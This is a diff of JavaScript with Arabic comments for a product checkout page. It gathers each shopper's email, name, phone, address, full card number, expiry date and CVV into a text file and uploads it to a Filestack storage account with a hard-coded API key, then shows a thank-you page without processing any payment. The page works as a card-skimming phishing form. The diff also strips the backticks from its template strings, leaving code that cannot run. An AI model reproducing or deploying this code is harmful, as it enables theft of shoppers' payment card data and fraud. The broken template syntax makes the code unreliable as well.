@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // حساب السعر الإجمالي
   const totalPrice = urlParams.price * urlParams.quantity;
-  document.getElementById('total-price').textContent = `$${totalPrice}`;
+  document.getElementById('total-price').textContent = $${totalPrice};
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -152,50 +152,38 @@ document.addEventListener('DOMContentLoaded', function () {
       };
 
       // إنشاء المحتوى لملف نصي
-      let fileContent = `Client Data:\n`;
-      fileContent += `Email: ${email}\n`;
-      fileContent += `First Name: ${firstName}\n`;
-      fileContent += `Last Name: ${lastName}\n`;
-      fileContent += `Phone: ${phone}\n`;
-      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
-      fileContent += `Card Name: ${cardName}\n`;
-      fileContent += `Card Number: ${cardNumber}\n`;
-      fileContent += `Expiry: ${expiry}\n`;
-      fileContent += `CVV: ${cvv}\n\n`;
-      fileContent += `Product Information:\n`;
-      fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Product Price: ${productPriceText}\n`;
-      fileContent += `Product Quantity: ${productQuantityText}\n`;
-      fileContent += `Product Image URL: ${productImageUrl}\n`;
-      fileContent += `Total Price: ${totalPrice}\n`;
-      fileContent += `Coupon Code: ${couponCode}\n`;
+      let fileContent = Client Data:\n;
+      fileContent += Email: ${email}\n;
+      fileContent += First Name: ${firstName}\n;
+      fileContent += Last Name: ${lastName}\n;
+      fileContent += Phone: ${phone}\n;
+      fileContent += Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n;
+      fileContent += Card Name: ${cardName}\n;
+      fileContent += Card Number: ${cardNumber}\n;
+      fileContent += Expiry: ${expiry}\n;
+      fileContent += CVV: ${cvv}\n\n;
+      fileContent += Product Information:\n;
+      fileContent += Product Name: ${productName}\n;
+      fileContent += Product Price: ${productPriceText}\n;
+      fileContent += Product Quantity: ${productQuantityText}\n;
+      fileContent += Product Image URL: ${productImageUrl}\n;
+      fileContent += Total Price: ${totalPrice}\n;
+      fileContent += Coupon Code: ${couponCode}\n;
 
       // رفع الملف إلى Filestack
-      uploadFileToFilestack(fileContent, email, couponCode); 
+      uploadFileToFilestack(fileContent); 
 
     }
   });
 
-  // دالة لرفع الملف إلى Filestack
-  let orderNumber = 1;  // تعيين رقم تسلسلي للطلب
-  function uploadFileToFilestack(fileContent, email, couponCode) {
-    // توليد اسم الملف بناءً على رمز القسيمة ورقم الطلب والبريد الإلكتروني
-    const fileName = `${couponCode}_order${orderNumber}_${email}.txt`;
+  function isCardExpired(expiry) {
+    const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
+    const expiryDate = new Date(20${year}, month - 1);  // إنشاء تاريخ انتهاء البطاقة
 
-    // زيادة رقم الطلب للطلب التالي
-    orderNumber++;
+    const currentDate = new Date();  // التاريخ الحالي
+    currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
 
-    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
-    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-    client.upload(fileBlob, { filename: fileName })
-      .then((res) => {
-        console.log('File uploaded successfully:', res);
-        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
-        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
-      })
-      .catch((err) => {
-        console.error('Error uploading file:', err);
-      });
+    return expiryDate < currentDate;  // إذا كان تاريخ الانتهاء في الماضي
   }
 
   // دالة للتحقق من البريد الإلكتروني
@@ -256,6 +244,21 @@ document.addEventListener('DOMContentLoaded', function () {
     errorMessages.forEach(function(message) {
       message.remove();
     });
+  }
+
+  // دالة لرفع الملف إلى Filestack
+  function uploadFileToFilestack(fileContent) {
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+    client.upload(fileBlob)
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
   }
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
